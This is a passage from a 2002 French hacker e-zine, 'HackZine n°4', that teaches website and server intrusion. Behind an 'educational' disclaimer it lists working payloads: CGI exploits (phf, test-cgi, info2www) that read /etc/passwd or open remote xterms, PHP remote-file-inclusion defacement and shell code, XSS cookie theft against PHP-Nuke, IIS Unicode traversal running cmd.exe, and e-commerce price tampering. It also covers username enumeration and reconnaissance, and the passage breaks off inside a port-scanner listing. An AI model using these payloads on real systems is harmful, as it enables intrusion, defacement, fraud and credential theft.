 _______________________________________________________________________________________
(                                                                                       )
(  H    H        A          CCCCC     K   K      ZZZZZZ      I     N     N     EEEEEEE  ) 
(  H    H       A A        C          K  K           Z       I     NN    N     E        )
(  HHHHHH      A   A      C           KKK           Z        I     N N   N     EEEEE    )
(  H    H     AAAAAAA     C           K  K         Z         I     N  N  N     E        )
(  H    H     A     A      C          K   K       Z          I     N   N N     E        )
(  H    H     A     A       CCCCC     K    K     ZZZZZZZ     I     N    NN     EEEEEEE  )  
 _______________________________________________________________________________________

    n° 4  édition spéciale  ;  --- Intrusion ---  By KefKa (nickairmax@caramail.com) 

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
NOTE : TOUTES LES INFORMATIONS PRESENTES DANS CE MANUEL SONT A TITRE PUREMENT EDUCATIFS,
ET NE DOIVENT ETRE EN AUCUN CAS REUTILISEES A DES FINS DOUTEUSES,  cf. loi Godfrain, 1985 
******************************************************************************************

SOMMAIRE :
- Introduction
- Chapitre 1, chercher des vulnérabilités sur le site
     * a) Lecture du code source
            ¤ faire diminuer le coût des produits
            ¤ faire sauter des mots de passe
     * b) Les attaques CGI
            ¤ 11 attaques à l'étude
            ¤ comment s'en protéger
     * c) Les failles php
            ¤ l'ignoble faille include
            ¤ comment s'en protéger
            ¤ failles phpnuke et ie
            ¤ comment s'en protéger
     * d) Les failles sous WinNT
            ¤ 6 attaques à l'étude
     * e) Le bogue du point asp
     * f) Conclusion
- Chapitre 2, identification de la cible
     * a) Recensement des noms d'utilisateurs
            ¤ par finger
            ¤ par whois
            ¤ par netbios 
            ¤ par lecture du code source
            ¤ par smtp sendmail
     * b) Obtenir des informations sur le serveur
            ¤ ping et fping
            ¤ tracert et traceroute
            ¤ mapper un réseau
     * c) Balayage des ports
            ¤ description des outils
            ¤ code source d'un scanneur de ports
            ¤ liste des ports vulnérables
     * d) O.S fingerprint  
            ¤ avec nmap
            ¤ autres méthodes
     * e) Conclusion
- Chapitre 3, windows hacking
    1. Win 9x
        * a) Les trojans
            ¤ définition
            ¤ comment s'en servir
            ¤ les plus connus
        * b) Hack par NetBios
        * c) Les attaques locales
            ¤ devenir administrateur
            ¤ les fichiers *.pwl
        * d) dénis de service pour win9x
            ¤ comment ça fonctionne
            ¤ code source d'un nuker
    2. Win NT
        * a) Les attaques à distances
            ¤ détection des mots de passe
            ¤ les buffer overflow
        * b) Les attaques locales
            ¤ pirater le sam
            ¤ le programme getadmin
    3. Conclusion
- Chapitre 4, linux hacking
        * a) Introduction
            ¤ le compilateur gcc
            ¤ les fichiers rhost
            ¤ les fichiers forward
            ¤ le root
            ¤ les exploits
            ¤ le shell
        * b) Accès à distance
            ¤ méthode par ftp/tftp
            ¤ cracker les fichiers passwd
            ¤ méthode par nfs
            ¤ reversed telnet
            ¤ inversed telnet
            ¤ les bugs de sendmail
            ¤ les buffer overflow
            ¤ attaques par chaîne de format       
        * c) Obtenir son shell root
            ¤ brute force cracking
            ¤ utiliser des exploits
            ¤ les race conditions
        * d) Aménager son accès
            ¤ attention aux logs
            ¤ installer une backdoor
            ¤ les rootkits
            ¤ les sniffers
        * e) Denial of service
            ¤ attaques syn flood
            ¤ technique du smurfing
            ¤ code source d'un smurfer
            ¤ attaques Ddos
        * f) Conclusion
- Chapitre 5, pour conclure en apogée
            ¤ qu'est ce qu'un 'vrai' hacker
            ¤ conclusion finale


******************************************************************************************


++ Introduction , où le père KefKa commence déjà à nous saouler...

Bonjour !!! Comme toujours, qui dit nouveau mois, qui dit nouveau zine, et c'est donc 
pourquoi je vous propose ce tout nouveau mag, dédié UNIQUEMENT aux méthodes qu'utillisent
les pirates pour s'infiltrer sur vos serveurs, aussi bien Linux que Windows ! Je suis 
polyvalent... Bon, même si certaines techniques ne sont plus trop d'actualité, cela reste
quand même asez interessant, pis de toute façon, si j'avais décidé de vous parler seule-
-ment des techniques modernes, croyez moi vous aurez du subir un exposé de 150 pages
sur les buffer overflow et autres race condition... 
C'est pas ça que vous voulez hein ? Comment ça si ! Ahem...
A la fin de ce texte, vous maîtriserez complètement (enfin je l'espère...) le comment
du piratage informatique, dans un contexte amateur seulement... Bééé oui lancer des 
exploit sur tous les serveurs que vous trouvez, obtenir des root à droite à gauche 
c'est super kewl, surtout sur un site gouvernemental ;), mais c'est pas pour autant que
vous pourrez vous considérez comme un hacker complet (merde alors je pensais que...) .
Euhh alors vous allez me dire c'est quoi un hacker ? Et ben un hacker c'est un mec (ou
une fille même parfois ca existe !!!) dont les deux seuls mots d'ordre sont 'programmer'
et 'aider' . Et si vous ne respectez pas ces deux utilmes règles, et bien soit vous
êtes un lammer ou soit vous êtes un crasher ! Programmer des logiciels libre,
sécuriser son/ses/des réseaux, signaler des failles, etc... est le crédo du bon hacker.
Si vous ne respectez pas ces quelques règles, et bien passez votre chemin...
Enfin, croyez le ou non, mais lire intensivement ce zine ne fera pas de vous un hacker 
(merde je perds mon lectorat du coup :p) Les hackers sont des elites, et personne ne
peut se prétendre 'hacker', car le hacker, le VRAI, devient de plus en plus rare à
trouver... De plus, tout devient de plus en plus dur à hacker, au fur et à mesure
que le temps passe, je ne crois cependant pas au système entièrement dénué de failles
mais faut croire que le hacking a tendance à s'affaiblir...
Démarquons nous des autres, montrons notre savoir de manière positive, réinventons 
l'underground, avec une politique plus sage, et avec beaucoup moins de cons surout...
;; faites l'amour pas la guerre :)

La série des HackZine est conçue de manière à vous faire avancer progressivement,
si vous êtes un leet, n'allez pas lire le HackZine1 compris ? :)

Bon, un dernier chtit rappel avant de commencer, tout ce que vous pourrez trouver
dans ce zine est à titre purement éducatif, appliquez ce qu'il y'a d'écrit serait :
1. Stupide, à vous de trouver VOS propres failles et de les exploiter VOUS même.
2. Inefficace, il n'existe aucune faille à long terme, l'espérance de vie d'un trou
de sécurité de dépasse pas les 15 jours, ô éphémères hackers...
3. Illégal, le piratage informatique au sens premier du terme n'est pas un art, et
en plus vous risquez gros (regardez par exemple AloneTrio, Cod4, DIEU, ou encore 
Mitnick, des pirates que les services secrets ont pu arrété) cf. loi Godfrain sob :(
Certes, je veux bien vous l'accorder, le défi que relève l'obtention d'un shell root
peut entraîner des accoutumances plus puissantes que le cannabis (ah oui au fait, le
mythe du hacker qui va en rave et qui se drogue n'est qu'un mythe, contrairement aux
dires de Neuralien, dsl pour les puristes, mais peu de hackers font ça, bien que cela
doit certainement exister lol) mais ne vous laissez pas entraîner.
En fait, on pourrait carrèment définir toute tentative de hack envers un serveur
UNIX comme une offense au brave Dennie Ritchies (mdr), vous n'allez quand même
pas profaner un mythe de l'informatique ??? 
Enfin, pour ce qui est de micro$oft et de son billou, va, passe encore, 
dieu vous le pardonnera...
(beuhh si, St.Pierre boote sous une mandrake, je l'ai vu :p)

Bon, comme je vois que mon discours vous emmerde, on commence...
Je vous sens bien trop impatient, va....



                   LeT's Go HaCkInG fOr FuN aNd pRofit ;)
                                 HAVE FUN





                                 /----------\
			     	        /(__)____(__)\
			              |HackZine n°4|
			             /    05/2002   \
			             \##############/
			              \&&&&&&&&&&&&/
				         \__________/ 




* CHAPITRE 1, où les choses sérieuses commencent....
    [ Chercher des vulnérabilités sur le site ]


Avant de commencer à jouer les hackers sur le serveur, nous devons tout d'abord
tenter une approche de script kiddie, c'est à dire chercher sur le site cible, avec
son navigateur, si il ne présente pas une belle grosse faille de sécurité, qui 
pourrait rapidement entraîner un défacage (= modification de la page d'accueil
d'un site) ou voir même, un accès à des informations plutôt confidentielles...



a) Lecture du code source

Nous allons donc commencer par effeuiller le code source des principales pages web
, comprendre ce code et essayer d'en tirer des informations intéressantes, comme
des mots de passe :)). Cette étape est donc facilement accessible à tous, et, bien
que facultative, peut aboutir à des résultats vraiment très interessants...
Imaginons par exemple l'extrait d'un code source d'un site d' e-commerce, comme il 
en existe des centaines sur la toile, qui se présente comme ceci :

<FORM ACTION="http://www.sitedecommerce.com/cgi-bin/formulaire.pl" method="post">
<input type=hidden name="prix" value="39,75€">
<!-- j'abrége, c'est juste cette partie du code qui nous interesse -->

Dans ce cas, on pourra carrèment s'approprier de l'article pour la somme de :
ce que vous voulez !!! Et facilement en plus, on enregistre le code source
dans un fichier du genre bidouille.htm après avoir modifié le contenu de la
balise FORM, largement révélateur... Donc on modifie cette ligne :

<input type=hidden name="prix" value="39,75€">

En la remplaçant par exemple, par :

<input type=hidden name="prix" value="0,75€">

On enregistre donc en *.htm, on clique dessus, et hop là magie, le prix de l'article
a diminué de 39 € !!!
Bon, là il est clair que l'exemple a été simplifié, mais ce genre de failles est
loin d'être rare ...

Autre exemple, les pages web peuvent parfois, après étude, révéler des infos 
très importantes, imaginons une fonction en javascript trouvée dans le code
d'une page web, présentée comme ceci :

function passwd() { 
var Goop = document.Qbert.PWORD.value 
document.Qbert.PWORD.value = Goop.toUpperCase() 
if (document.Qbert.PWORD.value == "MOTDEPASSEBIDON") { 
location.href="../desktop/index.html" 
} 
if (document.Qbert.PWORD.value != "MOTDEPASSEBIDON") { 
alert("Bad password, unable to open file :("); 

Ici, on se passe de commentaires !!! 

Bon, en fait ces attaques sont essentiellement dues à des erreurs de programmation,
et sont ma fois assez fréquentes ; Mais ce n'est pas avec ça que vous allez cartonner...



b) Les attaques CGI

Maintenant un autre type d'attaque, tout aussi plebiscité par la fraîche jeunesse...
Les attaques CGI (Common Gateway Interface) bien que plus beaucoup employées, 
consituaient une vraie mine d'or à l'époque, et font encore le bonheur de certains lamers...
Chaque vulnerabilité est décrite comme ceci :

Nom de l'attaque
-> Conséquence
/exploit
<- Solution afin d'éviter cela

Il y'en a des tonnes ...

Test cgi's
-> Permet de faire un dir des fichiers ou d'afficher le contenu de certains
fichiers (exemple etc/passwd :) )
/cgi-bin/test-cgi?\whatever
/cgi-bin/test-cgi?\help&0a/bin/cat%20/etc/passwd
/cgi-bin/test-cgi?/*
/cgi-bin/test-cgi?* HTTP/1.0
/cgi-bin/test-cgi?x *
/cgi-bin/nph-test-cgi?* HTTP/1.0
/cgi-bin/nph-test-cgi?x *
/cgi-bin/test-cgi?x HTTP/1.0 * 
<- Supprimer le fichier test-cgi

Info2www, versions 1.0-1.1
-> Permet d'executer des commandes arbitraires sur le serveur
/cgi-bin/info2www?(../../../../../../../bin/mail webmaster@site.com </etc/passwd)
/cgi-bin/info2www '(../../../../../../../bin/mail jami /cgi-bin/campas?%0acat%0a/etc/passwd%0a
<- Pas de solution sorry

Php.cgi
-> Permet d'afficher le contenu d'un fichier
/cgi-bin/php.cgi?/etc/passwd
<- Retirer le fichier php.cgi du repertoire cgi-bin

Files.pl
-> Permet d'afficher le contenu d'un fichier
/cgi-bin/files.pl? ../../ect/passwd
<- Supprimer le script files.pl du serveur

Nph-test-cgi
-> Permet de faire un dir des fichiers du serveur
/cgi-bin/nph-test-cgi?x HTTP/1.0 * 
/cgi-bin/nph-test-cgi?* HTTP/1.0 
/cgi-bin/nph-test-cgi?x * 
/cgi-bin/nph-test.cgi /*
<- Supprimer le fichier nph-test.cgi du serveur

Phf
-> Le célébre phf, qui permet d'executer des commandes sur le serveur
/cgi-bin/phf?Q=x%0apwd 
/cgi-bin/phf?Q=x%ffpwd 
/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
/cgi-bin/phf?%0a blablabla &Qalias=&Qname=&Qemail=&Qnickname=&Qoffice_phone= ... usw
/cgi-bin/phf?Qname=%0acat%20/etc/passwd
/cgi-bin/phf.cgi?Qalias=x%0a/usr/X11R6/bin/xterm%20-ut%20-display%20127.0.0.1:0.0 
(on y reviendra tout à l'heure)
<- La plupart des serveurs sont patchés contre phf, cette vulnérabilité est devenue
assez rare, alors ne vous faites de pas de mourron :)


Omnihttpd
-> S'identifier en tant qu'user guest sur le serveur
http://omni.server/cgi-bin/visadmin.exe?user=guest 
<- Je n'ai pas de solution sorry


Pfdispaly.cgi
-> Executer des commandes sur le serveur
/cgi-bin/pfdispaly.cgi?'%0A/bin/uname%20-a|'
/cgi-bin/pfdispaly.cgi?/../../../../etc/motd
/cgi-bin/pfdispaly.cgi?'%0A/usr/bin/X11/xclock%20-display%20evil:0.0|' 
<- Supprimer le fichier pfdisplay.cgi 

Faxsurvey
-> Executer des commandes sur le serveur
/cgi-bin/faxsurvey?/bin/cat%20/etc/passwd
/cgi-bin/faxsurvey?/bin/ls%20-a
<- Cette faille ne concerne que les versions Suse de linux, avec le package HylaFax installé

Whois_raw.cgi cdomain v1.0.
-> Executer des commandes sur le serveur
/cgi-bin/whois_raw.cgi?fqdn=%0A/usr/X11R6/bin/xterm%20-display%20127.0.0.1:0
/cgi-bin/whois_raw.cgi?fqdn=%0acat%20/etc/passwd 
<- Supprimer le fichier whois_raw.cgi du serveur


Test.bat et perl.exe sur Netscape Serveur
-> Executer des commandes sur le serveur
/cgi-bin/test.bat?&dir .
<- Retirer le fichier test.bat du repertoire cgi-bin

Htmlscript (www.htmlscript.com)
-> Afficher le contenu d'un fichier
/cgi-bin/htmlscript?../../../../etc/passwd 
<- Huh, pas de solution encore dsl

Cette liste n'est pas exhaustive... Comme vous pouvez le constater les vulnérabilités
cgi-bin sont extrémement nombreuses, mais pas toujours efficaces, heuresement pour nous ;p
IL existe aussi des programmes qui automatisent la recherche de failles cgi sur un site,
je pense surtout à Vulnerability_scan , bien que difficile à trouver enfin bon... 



c) Les failles php

Ces failles sont très exploitées de nos jours... Et ça marche bien en plus :p
La plupart des failles php sont des failles include, qui permettent de passer
un path à une variable quelconque... Et si il n'y a pas de flitrage défini dans
le fichier index.php , et bien le pirate pourra executer son script en mettant
un path spécifique.
Prenons pour exemple ce site, http://www.ihaveaphphole.com

Arrivé sur ce site, je clique sur un lien, du genre 'Cliquez 
ici pour accèder au site' .
Mon navigateur se redirige vers :
http://www.ihaveaphphole.com/index.php?A=index.htm
Interessé, je décide d'aller voir le forum :
http://www.ihaveaphphole.com/index.php?A=forum.php

Je constate donc que le site utilise la variable A pour afficher ses pages.
Je vérifie maintenant si cette variable filtre les fichiers en provenance de
l'extérieur, comme cela :
http://www.ihaveaphphole.com/index.php?A=http://www.autresite.com
La page d'accueil de http://www.autresite.com s'affiche ? 
Bravo, vous pouvez dors et déjà déduire que le htm n'est pas filtré.
Maintenant, tentons de faire passer un script php d'un autre site :
http://www.ihaveaphphole.com/index.php?A=http://www.site.com/index.php
La page d'accueil de http://www.site.com s'affiche ?
Pas de doute, cela signifie que le fichier index.php a été executé.
On va maintenant créer un serveur, acceptant le php genre un serveur
crée avec EasyPhp, et on va placer dans le /www du serveur ce script :

<?
$fp = fopen("index.htm", "w");
fwrite(fp, "HaCkeD By KefKa");
fclose($fp);
?>

On lui donne un nom (hack.php) et on va maintenant l'executer au moyen de la
variable A, de cette manière :
http://www.ihaveaphphole.com/index.php?A=http://notre_serveur/hack.php
Que se passe t'il ? Et bien c'est simple, notre script a été executé !
Et que fait ce script ? Même sans faire de php vous pouvez comprendre...
Tout d'abord, on ouvre en écriture le fichier index.htm ($fp = fopen(...))
puis, au moyen de la fonction fwrite() on écrit dedans le message suivant,
lourd de sens : HaCkeD By KefKa . Nous reste plus qu'à fermer le fichier
index.htm, par le biais de fclose() .
En gros, l'execution de ce script va vous permettre de défacer le site...
Now, on retourne sur :
http://www.ihaveaphphole.com/index.php?A=index.htm
Et là Ô surprise, on voit le message 'HaCkeD By KefKa' à l'écran !!!

On aurait également pu programmer dans notre fichier hack.php
un escape shell, du genre system($cmd); qui donne carrément un
shell sur la bécane... Sympa ce php finalement... :p

Ah oui, j'allais oublier, afin de sécuriser votre site de ces éventuelles 
attaques, voilà justement un exemple de fichier index.php sécurisé :

<?php 
if(empty($page)) 
{ 
include ("default.php"); 
} else { 
if(!is_file("$page")){ 
echo "<br><br><center><H1>Intrusion Alert</H1></center><br>"; 
echo "Alors, ptit mec', on fait du cross site scripting ? tsss :p<br>";
echo "Ton attaque a bien été enregistrée, on va prévenir ta fai, a bientot !";
} else { 
include ("$page"); 
} 
} 
?>

Lolll, maintenant chaque personne qui essayera d'exporter quelconque fichier
en provenance d'un autre site, il verra ce message là s'afficher :


                     INTRUSION ALERT
Alors, ptit mec', on fait du cross site scripting ? tsss :p
Ton attaque a bien été enregistrée, on va prévenir ta fai, a bientot !


Marrant nan ? Mais bon, ce script n'est pas censé resister aux attaques locales
(heureusement d'ailleurs) alors faites attention !
Et si vous ne voulez pas vous embeter à taper tout ce code, rajoutez simplement
un petit if($file<>$1 || $2){ $file="404.php"; } dans le fichier index.php et le tour 
sera joué... :)

Mais on aurait pu exploiter cette faille différemment.
Exemple, on essaye d'accèder à la partie d'administration d'un site qui utilise le php :
http://www.site.com/admin
Supposons que l'on tombe sur une page qui demande un mot de passe.
On va dire que le site emploie la variable A pour afficher ses documents.
Avec un peut de chance, la page index de /admin aura l'extension .php. 
Il suffit de passer en argument à la page index.php la page index de /admin !

Exemple :
http://www.site.com/index.php?A=admin/index

On est maintenant redirigé sur la partie admin, avec tous les droits en plus !!!
Ce type de faille peut aussi nous permettre d'afficher des fichiers du serveur :
Par exemple : http://www.site.com/index.php?A=/etc/passwd à surveiller donc...

En ce qui concerne la sécurisation, c'est la même chose que tout à l'heure, je ne le
repeterais pas :) . 



Autre type de faille maintenant, relative à PHPNUKE.
Nous allons donc reprendre l'exemple d'un site qui utilise le phpnuke, apellons le
http://www.phpnukerulez.com
Voilà le principe de ce hack : PHPNUKE enregistre les logins/passwd dans un cookie
le but étant donc de récupérer ce cookie, et de décrypter ce password, qui est 
ô bonheur, en base 64, et donc très facilement décryptable :)

Pour récupérer ce cookie, nous allons exploiter une des vulnérabilités de Internet
Explorer, qui permet d'executer du script java qui pourrait se présenter comme
ceci dans un lien en html :
<a href="about:<script>alert('You are hacked');</script>" target="_blank">Cliques ici</a>

En javascript, la fonction qui permet de récupérer le cookie de la page actuelle est
document.cookie, nous allons être obligés de passer par la rédaction d'un petit script 
en html, en effet, si vous esayez http://www.phpnukerulez.com/<script>...</script> le code
ne sera pas interpreté, à moins de passer par une vulnérabilité shtml, mais ça c'est 
une autre histoire... Le script html, donc, on va y insérer par exemple ce lien :

<a href="about://www.phpnukerulez/<script>document.write(document.cookie);</script>">Clik ici</a>

Ce lien nous aménera dans une nouvelle fenêtre, contenant le cookie de la page en cours !!!
Il ne nous restera plus qu'à décrypter les mots de passe et login d'administration codés
en base 64, et donc facilement décodables, un décrypteur est trouvable sur http://www.isecurelabs.com

La sécurisation se passe en deux étapes : côté administrateur, retirer les logins/passwords du
cookie, et côté utilisateur, patcher son internet explorer, malheuresement très sensible
à un virus en javascript, comme on a pu voir tout à l'heure.


Voilà, nous avons fais à peu près le tour de tout ce qui concerne les failles php,
très fréquentes et très facilement exploitables... 
Mais le vol de cookies peut aussi servir à pirater des utilisateurs, loggés sur des
webmails assez capricieux... (lisez les articles de Fozzy à ce sujet, parus dans 
Hackerz Voice, pour vous en convaincre := )



d) Les failles sous WinNt

NB : On va reprendre un de mes articles parus précedemment dans HackZine3, faut
pas s'embeter non plus :p 

Faille IIS Unicode
http://site/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+/s+c:\
Exemple :

Et cela fait un dir sur le serveur, à partir de là vous allez pouvoir vous amuser :p

Autres commandes :
COPY : Copie un ou plusieurs fichiers vers un autre emplacement 
DEL : Supprime un ou plusieurs fichiers
DIR : Affiche une liste de fichiers et de sous-répertoires dans un répertoire. 
EDIT : Editeur de texte en mode DOS 
MD : Crée un répertoire 
RD : Supprime ou efface un répertoire 
REN : Renomme un fichier/répertoire ou un groupe de fichiers/répertoires 

Toutes ces commandes sont à mettre a la place de dir et il fo enlever le /s :
Exemple : http://lesite/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+/s+c:\

A noter également que vous pouvez remplacer le /scripts/ par /iisadmin ou /_vti_bin/.
Pour faciliter les choses, procurez vous VulnerabilityScan ou NTscan ...    ;=


Faille Coldfusion
Cette faille vous permet d'afficher n'importe quel fichier present sur le disque dur de l'hote. 

Exemple :
http://www.site.com/cfdocs/expeval/exprcalc.cfm?OpenFilePath=c:\autoexec.bat
Ceci affichera le fichier c:\autoexec.bat arffffff


Faille .htr
Cette faille permet d'afficher le contenu d'un fichier.
Exemple :
http://www.sitebidon.com/fichier.txt+.htr


Faille shtml.exe
Cette faille permet d'obetnir le path du site web sur le disque dur du serveur (path qui est 
par defaut c:\InetPub\wwwroot\). Pour l'exploiter il faut aller à cette adresse :
http://www.sitebidon/_vti_bin/shtml.exe/fichier.htm

Mais avec shtml, on peut surtout faire executer du script hostile :)
Tout de suite un exemple :
http://www.sitebidon.domainebidon/shtml/<script langage="javascript">alert("Hacked");</script>

Vous pouvez par exemple envoyer des virus en javascript sur une boîte de reception, à
partir de cette simple adresse ! Regardez, supposons que j'envoie ceci en html :

<html>
<body>
<a href="http://www.site.com/shtml/<script langage="Javascript">for (i=0;i<5000;i++) { window.open("about:blank"); }</script>Cliquez ici !!! :p</a>
</body>
</html>

Dès que la victime cliquera sur ce lien présenté en html, elle ira sur le site
ayant la faille shtml.exe et executera sans le savoir mon code javascript, qui
lui ouvrira 5000 fenêtres vides !! Bon, c'est juste un exemple hein, peux mieux faire...


Faille shtml.dll
Cette faille permet d'executer un script hostile : si, sur un site ce lien apparait :
<a href="http://serveursecurise/_vti_bin/shtml.dll/<script>script de code hostile à placer ici
</script>">http://serveursecurise</a>
Le script sera passé dans la requête http et l'utilisateur qui a cliqué sur le lien arrivera 
sur le site serveur securise où une page d'erreur affichera le code hostile (et l'executera).
Même chose que pour tout à l'heure...


Faille query
Cette faille permet aussi d'afficher n'importe quel fichier present sur le disque dur du serveur : 

http://site/query.idq?CiTemplate=../../../win.ini
Ceci affichera le fichier win.ini à la racine du disque dur.


Pour vous protéger de ces failles très embétantes, il existe plusieurs patch, 
made in micro$oft mais résolument efficaces



e) Le bogue du point asp

Bon, je vais essayer d'être rapide à ce sujet. Ce fameux bogue a été découvert
en 1997 par un membre du L0pht, et je crois qu'il est devenu obsoléte sur la plupart
des serveurs... Cela consiste à afficher le contenu de n'importe quel fichier asp
d'un serveur, au moyen d'un seul caractère...

http://www.ihaveaasphole.com/listedespaswords.asp. (<- Présence du point après *.asp)

Voilà, donc en rajoutant un . après le nom du fichier asp, on pourra en afficher
le contenu, dans notre exemple le fichier listedespaswords.asp sera affiché à l'écran...
Comme beaucoup de serveurs ont été patchés à ce sujet, je vous propose une méthode
toute bête, qui consiste à remplacer le point par sa valeur en héxadécimal (et oui
c'est tout bête fallait y penser !), c'est à dire %2e . Cela donnera :

http://www.ihaveaasphole.com/listedespaswords%2easp

Je n'ai personnelement pas testé cette méthode, à vous de m'en donner des nouvelles :)



f) Conclusion

Voilà, ce premier chapitre est fini. Ne croyez pas que les nombreuses failles décrites
soient 100% efficaces, où encore qu'il n'existe pas d'autres failles...
Plus d'une centaine de failles de ce type sont découvertes chaques année, toutes
les référencier est donc pratiquement impossible.

Bon, donc voilà, je ne m'attarderais pas plus sur les failles au niveau du web.
Si vous voulez plus d'infos, ahem il existe des moteurs de recherche pour ça.

Si le site ne présente pas de vulnerabilité apparente, et bien il est temps pour 
vous de passer à la suite des événements, et croyez moi ce sera long...

Suivez mon doigt (oui oui c'est bien un doigt !=)
 
   | |
   |-|
   | |        //  Si les failles décrites ci dessus ne vous ont pas
   \o/            contentées, vous allez devoir lire le chapitre suivant      
    -             dsl pour les pressés ;)





* CHAPITRE 2, où le hacking commence à devenir vraiment redhibitoire....
    [ Identification de la cible ]


En réalité, les hackers procédent le plus souvent à une identification partielle 
de la cible, qui consiste juste à scanner les ports de la bécane.
Ce qui n'est pas complétement idiot puisque je doute qu'il fasse disposer du nom
de tous les utilisateurs d'un site pour pouvoir le pirater par la suite...

Les techniques que nous allons donc aborder dans ce chapitre seront pour la plupart
facultatives, à moins que vous ayez décidé de mapper le réseau du fbi....
Bon, sans plus tarder, we let's go...



a) Recensement des noms d'utilisateurs

1. Par finger (79)
Choper des noms d'utilisateurs est un art assez bénin...
La méthode la plus sûre consiste à faire un finger sur le site cible,
mais dans ce cas il faut que le service finger (qui tourne sur le port
79), soit activé... Il vous faudra donc effectuer un balayage des ports voilà.
Si le port 79 est ouvert, tapez donc :
>>> finger -1 @sitealacon.com
My god, et si ca marche, vous verrez une liste de noms d'utilisateurs s'afficher
devant vos yeux ebahis.... 
Vous pouvez d'ailleurs, toujours par le moyen de la commande finger, obtenir
des renseignements un peu plus précis sur les noms d'utilisateurs. Exemple :
>>> finger -1 @pseudo.sitealacon.com
Et vous obtiendrez des tas d'info sur le shell, le nom, et le repertoire
de l'utilisateur cible.

2. Par whois
Et si le service finger n'est pas disponible, et bien vous pourrez toujours
utiliser le célèbre whois, qui vous donnera beacoup d'information sur le
système cible, les noms d'user bien sur, mais aussi leur n° de tel, ou
leur adresse e-mail, chose pas très bien utile à d'ailleurs, à moins
que vous vouliez faire du Social Engeneering...
Les outils whois sont très nombreux : Si vous avez Linux vous disposez
déjà de l'outil fwhois, intégré au système.
Pour Windows, y'en a beucoup, mais je vous conseile surtout The Analyser
(trouvable je sais plus où :() ou WS_PING_PRO_PACK (http://www.ipswitch.com)

3. Par Netbios
Autre technique, si le système cible a le port 139 ouvert, vous pouvez être
(quasi) sûr de deux choses.
- La cible est sous Windows
- Vous pouvez obtenir les noms d'utilisateurs en moins de deux.
Et pour cela, vous suffit d'ouvrir une session dos et de taper :
>>> NBTSTAT -A ip-de-la-cible
Et vous aurez une liste de noms d'oiseaux, euh d'utilisateurs plutôt...
Vous pouvez également vous servir de netuse si le port 139 est ouvert...
Mais je ne préfère pas en dire plus, reportez vous au chapitre suivant pour savoir
koman kon hacke un serveur windows...

4. Par lecture du code source
Ca, c'est carrèment la méthode la plus débile, mieux vaut être un passionné
de html... Bon, en quoi consiste cete méthode ? Et bien tout hacker
bizaremment constitué pourra effeuiller les codes sources à la recherche
d'informations concernant par exemple l'équipement de l'entreprise, des liens
des contacts etc.... 
Cela sera surtout les commentaires qui nous interesseront (si si vous savez ces
chtites phrases dans les codes sources placés entre les balises <!-- et --> ...).

5. Vive Sendmail !
Si le réseau à la chance d'être équipé d'un serveur SMTP Sendmail, vous allez
pouvoir vérifier les logins précédemment trouvés.
Pour ça connectez vous par telnet au serveur SMTP du réseau, si il y'en a un :
>>> telnet serveur_smtp
Le serveur va maintenant s'identifier à vous, vous pourrez donc voir
si il s'agit oui ou non d'un Sendmail.
Si oui, vous pourrez entrez les commandes suivantes :
Pour vérifier un pseudo tapez :
>>> VRFY pseudo 
Pour obtenir une adresse e-mail à partir d'un pseudo :
>>> EXPN pseudo
Huhu, voilà... Sinon vous pouvez toujours envoyer des xterm, ou rapatrier le 
fichier etc/passwd , mais ça on y reviendra tout à l'heure.... :)



b) Obtenir des informations sur le serveur

C'est évidemment ce qui nous interesse le plus.
On va commencer déjà par envoyer un ping (=requête) pour déterminer si le système
cible existe bel et bien , et surtout scanner les systèmes actifs sur le réseau, 
il vous faudra bien entendu executer ce scan en LOCAL...
Pour cela vous pouvez telechargez fping, et spécifiez les ip du réseau cible que
vous voulez scanner, pour ça créez un fichier texte et mettez dedans les ip, genre :
192.168.1.0
192.168.1.1
192.168.1.2
...
192.168.1.255
Puis avec fping, installé sous linux :
>>> fping -f fichierdesips.txt
fping est trouvable je sais plus ou... Mais bon le fping ne concerne que les attaques
en local et est donc inutilisable si vous n'avez pas déjà accès au réseau mdr...

Bon, plus sérieuresement, vous pouvez chercher à avoir un aperçu de ce
qu'il y'a sur le réseau.
Depuis Windows :
>>> tracert www.site.com
Ou depuis Linux :
>>> traceroute www.site.com
Comme ça vous aurez le nom des serveurs existants, l'ip des routeurs, leur localisation,
si il existe des firewall ou non, en fait vous aurez une vue globale sur l'ensemble du réseau.
Si vous voulez des résultats encore plus précis, vous pouvez essayer de mapper le réseau, 
pour cela il existe des logiciels spéciaux, citons par exemple le célèbre VisualRoute
(www.visualroute.com) bon évidemment c'est pas gratuit mais bon... ;)



c) Balayage des ports

Le balayage des ports est une étape obligatoire si vous avez l'intention
d'infiltrer quelconque serveur...
En ce qui concerne les scanneurs de ports, il y'en a beacoup, et les meilleurs sont
sans doute Pscan11 pour Windows et le fantastique nmap pour Linux...

Vous pouvez également créer vous même votre scanneur de ports, le principe est 
très simple. En gros, on va créer une socket en local que l'on va ensuite
esayer de connecter à une socket distante, placée sur un serveur, et assignée
à un numéro de port bien précis. Si la connection est possible, si la tentative
de connection renvoie une valeur supérieure à un, cela signifie que la socket est
ouverte, le scanneur va donc nous renvoyer le numéro du port ouvert associé à la socket.

Ci-dessous un petit scanneur de ports très simple, codé en c :


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

/*********************************/
/*      KefScan - By [Kefka]     */
/*  nickairmax@caramail.com      */
/*      ou retrouvez moi sur     */ 
/*       irc.jeuxvideo.com       */
/*    ---All right reserved---   */
/*********************************/

/* Déclaration des directives */

#include <stdio.h>         
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>


/* Fonction sockscan() */

int sockscan(char nomduserveur[], int nbredePorts)     
{
/* Déclaration de la structure sockaddr */
   struct sockaddr_in addrSocket;
/* Déclaration du pointeur serveur sur la structure hostent */
   struct hostent *serveur;
/* Déclaration des variables, initialisation des variables à zéro (fd pour la socket, i pour 
le compteur de la boucle for, et portsOuverts pour le nombre de ports ouverts :))) */
   int fd, i, portsOuverts = 0;
/* Conversion de l'adresse du serveur en format réseau */
   serveur = gethostbyname(nomduserveur);
/* Initialisation de la structure sockaddr */
   addrSocket.sin_family = AF_INET;
